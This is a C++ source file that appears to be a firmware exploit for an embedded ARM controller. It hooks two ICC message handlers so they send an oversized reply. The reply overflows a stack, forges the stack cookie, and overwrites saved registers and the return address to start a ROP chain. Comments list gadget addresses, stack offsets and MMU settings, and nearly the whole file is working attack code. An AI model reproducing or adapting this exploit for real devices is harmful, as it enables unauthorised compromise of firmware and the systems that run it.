/*
arm-none-eabi-g++ -Os -mthumb -march=armv7-m -nostdlib -fpie -fno-exceptions -ffunction-sections -Wall -Werror emc_dled_hook.cpp -Temc_dled_hook.ld -o emc_dled_hook && arm-none-eabi-objcopy -O binary emc_dled_hook
*/
#include <cstdint>

using u8 = uint8_t;
using u16 = uint16_t;
using u32 = uint32_t;

extern "C" {
    int hcmd_sys_make_head_param(void *req, void **reply, u32 len);
}

#pragma pack(push, 1)
struct IccHeader {
    u8 cpu_id;
    u8 srv;
    u16 msg;
    u16 src;
    u16 tid;
    u16 size;
    u16 csum;
};
struct IccReply {
    IccHeader hdr;
    u16 status;
};
struct OverflowData {
    u32 cookie;
    // dled_set return
    // sp should be 5AFA8 after popping
    // POP      {R4-R8,R10,R11,LR}
    u32 r4,r5,r6,r7,r8,r10,r11,lr;
    // gadget @ 0x9930
    // pc comes from new stack!
    // POP      {R0-R12}
    // LDMFD    SP, {SP,LR}^
    // ADD      SP, SP, #8
    // POP      {PC}^
    //u32 ctx_regs[16];
    // 775C
    // MOV             SP, R11
    // POP             {R11,PC}
    //u32 stack_swap[2];
};
struct HackMsg {
    IccReply reply;
    u8 pad[0x20 - sizeof(IccReply)];
    OverflowData overflow;
};
#pragma pack(push)

/*
initial sctlr: 0xC50078
mmu_enable: |= 0x1085

SP = 0x5b000
13EB0
    PUSH            {R4-R9,R11,LR}          8   0x5afe0
    ...
    SUB             SP, SP, #0x10           4   0x5afd0
93D8
    SUB             SP, SP, #0xC            3   0x5afc4
    PUSH            {R11,LR}                2   0x5afbc
    ...
    SUB             SP, SP, #4              1   0x5afb8
9400
    PUSH            {R4,R5,R11,LR}          4   0x5afa8
C118
    PUSH            {R4-R8,R10,R11,LR}      8   0x5af88
*/

/*
seg000:000266F8   LDR             R2, [SP,#8]
seg000:000266FC   LDR             R3, [SP,#0xC]
seg000:00026700   ADD             SP, SP, #0x10
seg000:00026704   POP             {R11,PC}

seg000:00002834   MOV             R0, R4
seg000:00002838   POP             {R4,R10,R11,PC}

seg000:000040C4   MOV             R0, R4
seg000:000040C8   SUB             SP, R11, #0x1C
seg000:000040CC   POP             {R4-R11,PC}

seg000:000044E8   LDR             R0, [R0,R4]
seg000:000044EC   POP             {R4,R10,R11,PC}

seg000:00012790   MOV             R0, R4                ; a1
seg000:00012794   POP             {R4,R10,R11,LR}
seg000:00012798   BX              R2

seg000:0001F540   POP             {R4-R9,R11,PC}

seg000:0000D274   MOV             R0, R6
seg000:0000D278   MOV             R1, R10
seg000:0000D27C   MOV             R2, R8
seg000:0000D280   BLX             R5
seg000:0000D284   SUB             SP, R11, #0x1C
seg000:0000D288   POP             {R4-R11,PC}

seg000:000269FC   MOV             R0, R6
seg000:00026A00   MOV             R1, R5
seg000:00026A04   SUB             SP, R11, #0x1C
seg000:00026A08   POP             {R4-R11,PC}

seg000:000076EC   POP             {R11,LR}
seg000:000076F0   BX              R3
*/

static int set_hack_reply(IccHeader *req, HackMsg **reply) {
    u16 reply_len = sizeof(HackMsg);
    if (hcmd_sys_make_head_param(req, (void**)reply, reply_len)) {
        return 2308;
    }
    (*reply)->reply.hdr.tid = 0;
    auto& ov = (*reply)->overflow;
    ov.cookie = 0x91E64730;
    // TODO just put ropchain in here instead of python?
    ov.r5 = 0x119C; // nop
    ov.r11 = 0x58800000;
    ov.lr = 0x775C;
    return 0;
}

// replace hcmd_srv_9_dled_msg_20_set 0x121988 T
// must be <= 0xf4
extern "C" int dled_set(IccHeader *req, HackMsg **reply) {
    return set_hack_reply(req, reply);
}

// 123F9C T
extern "C" int hcmd_srv_7_wdt_deliver(IccHeader *req, HackMsg **reply) {
    if (req->msg == 0) {
        // wdt_start
        return set_hack_reply(req, reply);
    }
    return hcmd_sys_make_head_param(req, (void**)reply, 32);
}
